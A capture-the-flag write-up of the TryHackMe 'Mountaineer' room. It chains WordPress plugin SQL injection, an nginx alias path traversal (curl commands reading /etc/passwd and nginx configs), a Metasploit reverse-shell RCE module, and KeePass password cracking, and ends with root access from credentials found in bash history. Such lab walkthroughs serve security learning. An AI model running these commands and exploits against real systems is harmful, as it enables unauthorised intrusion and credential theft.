---
title: "Mountaineer"
date: 2025-06-30
draft: false
summary: "Writeup for Mountaineer CTF challenge on TryHackMe."
tags: ["linux", "lfi", "hardcoded creds", "wordpress", "rce", "hash crack"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/mountaineer/cover.webp"
  caption: "Mountaineer TryHackMe Challenge"
  alt: "Mountaineer cover"
platform: "TryHackMe"
---

Will you find the flags between all these mountains?
<!--more-->
To access the machine, click on the link given below:
- https://tryhackme.com/room/mountaineerlinux

## Reconnaissance

I performed an **nmap** aggressive scan and found 2 open ports on the target.

```shell
nmap -A -p- TARGET --min-rate 10000 -oN mount.nmap
```

![](https://cdn.ziomsec.com/mountaineer/1.webp)

## Initial Foothold

I accessed the web application running on the target and landed on a default **nginx** page.

![](https://cdn.ziomsec.com/mountaineer/2.webp)

I fuzzed it for hidden directories and found a directory called *wordpress*.

```shell
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![](https://cdn.ziomsec.com/mountaineer/3.webp)

I accessed the page and noticed that the resources weren't being loaded properly.

I viewed the *network* tab in my developer's tools to see the requests made by the application and found the domain that was mapped to it.

![](https://cdn.ziomsec.com/mountaineer/4.webp)

I mapped the domain to the target IP in my */etc/hosts* file and refreshed the page.

![](https://cdn.ziomsec.com/mountaineer/5.webp)

The `wp-login.php` endpoint was accessible which could allow me to access the dashboard and potentially get a reverse shell.

I then enumerated plugins and users using **wpscan**.

```shell
wpscan --url http://mountaineer.thm/wordpress/ --enumerate ap,u
```

![](https://cdn.ziomsec.com/mountaineer/6.webp)

![](https://cdn.ziomsec.com/mountaineer/7.webp)

**wpscan** found a bunch of users and interesting plugins. 

```
Cho0yu
Everest
MontBlanc
admin
everest
montblanc
chooyu
k2
```

The version of *modern-events-calendar* plugin seemed to have some vulnerabilities. I booted the **metasploit** framework and searched for modules related to that plugin.

```shell
search wordpress modern
```

![](https://cdn.ziomsec.com/mountaineer/8.webp)

Here, I found an auxiliary scanner that exploited an **sql injection** vulnerability to query username, passwords. I added the required settings and ran the scanner to find the admin credentials.

```shell
use auxiliary/scanner/http/wp_modern_events_calender_sqli
set RHOSTS mountaineer.thm
set TARGETURI /wordpress/
```

![](https://cdn.ziomsec.com/mountaineer/9.webp)

However, these credentials did not work.

![](https://cdn.ziomsec.com/mountaineer/10.webp)

I then fuzzed for directories and noticed something unusual. **Wordpress** stores image in the `wp-content` directory. There was a separate folder called **`images`**.  This could mean that it probably was an alias that pointed to the actual folder inside `wp-content`.

```
ffuf -u http://mountaineer.thm/wordpress/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt
```

![](https://cdn.ziomsec.com/mountaineer/11.webp)

I referred to **hacktricks** and found a potential misconfiguration on the target.
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/nginx.html

This misconfiguration allowed Local file read. So, I exploited this to read local files.

```shell
curl --path-as-is http://mountaineer.thm/wordpress/images../etc/passwd
```

![](https://cdn.ziomsec.com/mountaineer/12.webp)

I then read the configuration file but did not find anything useful.

```shell
curl --path-as-is http://mountaineer.thm/wordpress/images../etc/nginx/nginx.conf
```

I googled for interesting files that I could read inside the directory and tried looking for files inside `/etc/nginx/sites-available/`.

![](https://cdn.ziomsec.com/mountaineer/13.webp)

I used **ffuf** and found a file called `default`.

```shell
ffuf -u http://mountaineer.thm/wordpress/images../etc/nginx/sites-available/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

![](https://cdn.ziomsec.com/mountaineer/14.webp)

Reading the file revealed a new subdomain.

```shell
curl --path-as-is http://mountaineer.thm/wordpress/images../etc/nginx/sites-available/default
```

![](https://cdn.ziomsec.com/mountaineer/15.webp)

I added the subdomain in my `/etc/hosts` file and accessed the endpoint.

![](https://cdn.ziomsec.com/mountaineer/16.webp)

I tried the admin credentials but failed to log in using it. I then tried default credentials with the discovered usernames. Finally, I logged in using **`k2:k2`**

I found a mail that contained a password.

![](https://cdn.ziomsec.com/mountaineer/17.webp)

Another mail was about the password that was revealed.

![](https://cdn.ziomsec.com/mountaineer/18.webp)

I tried the password with the `k2` user and managed to log in through the `wp-login` endpoint.

![](https://cdn.ziomsec.com/mountaineer/19.webp)

With valid credentials, I could now try getting remote code execution through the rce module for the vulnerable plugin on **metasploit**.

```shell
use exploit/multi/http/wp_plugin_modern_events_calender_rce
set USERNAME k2
set PASSWORD th3_tall3st_password_in_th3_world
set LHOST LISTENER_IP
set RHOSTS TARGET
set TARGETURI /wordpress/
run
```

I got a shell as *www-data*.

![](https://cdn.ziomsec.com/mountaineer/20.webp)

## Lateral Movement

I then enumerated the contents present inside the user directories and discovered that the flag was located inside the *kangchenjunga*'s home directory.

![](https://cdn.ziomsec.com/mountaineer/21.webp)

I found a file called *ToDo.txt* inside *nanga*'s home directory which contained an interesting message.

![](https://cdn.ziomsec.com/mountaineer/22.webp)

I also found a **keepass** file inside *lhotse*'s home directory.

![](https://cdn.ziomsec.com/mountaineer/23.webp)

I downloaded the file locally and tried opening it. However, it was password protected.

![](https://cdn.ziomsec.com/mountaineer/24.webp)

I used **keepass2john** to convert it into **john** crackable format and tried cracking the password using *rockyou.txt*, however, it was taking quite some time to crack it.

```shell
keepass2john Backup.kdbx > keehash
john --wordlist=/usr/share/wordlists/rockyou.txt keehash
```

With the password cracking running in the background, I tried switching to the user **k2** using the credentials I had previously discovered. I successfully, switched using **`k2:k2`**. After switching the user, I decided to view the mail because of what the *ToDo.txt* said.

```shel
su k2
cd mail
```

![](https://cdn.ziomsec.com/mountaineer/25.webp)

I found some interesting information that could be used to create a custom password list.

![](https://cdn.ziomsec.com/mountaineer/26.webp)

Hence, I downloaded **CUPP** and ran it in interactive mode.
- https://github.com/Mebus/cupp.git

I filled in the information that was available to me and generated a custom wordlist.

```shell
chmod +x cupp.py
./cupp.py -i
```

![](https://cdn.ziomsec.com/mountaineer/27.webp)

I then restarted password cracking with **john** using the custom wordlist and found the password.

![](https://cdn.ziomsec.com/mountaineer/28.webp)

The password allowed me to view the contents inside the file where I found user credentials.

![](https://cdn.ziomsec.com/mountaineer/29.webp)

Since, *kangchenjunga* had the local flag, I logged into the target using **ssh**.

```shell
ssj kangchenjunga@TARGET
```

Finally, I captured the local flag.

![](https://cdn.ziomsec.com/mountaineer/30.webp)

## Privilege Escalation

My directory also contained a **`.bash_history`** file which contained command history. I read the file and found the root credentials.

```shell
cat .bash_history
```

![](https://cdn.ziomsec.com/mountaineer/31.webp)

I then switched to root user and captured the final flag from the *`/root`* directory.

```shell
su root
cat /root/root.txt
```

![](https://cdn.ziomsec.com/mountaineer/32.webp)

![](https://cdn.ziomsec.com/mountaineer/33.webp)

That's it from my side !
Until next time :)

---
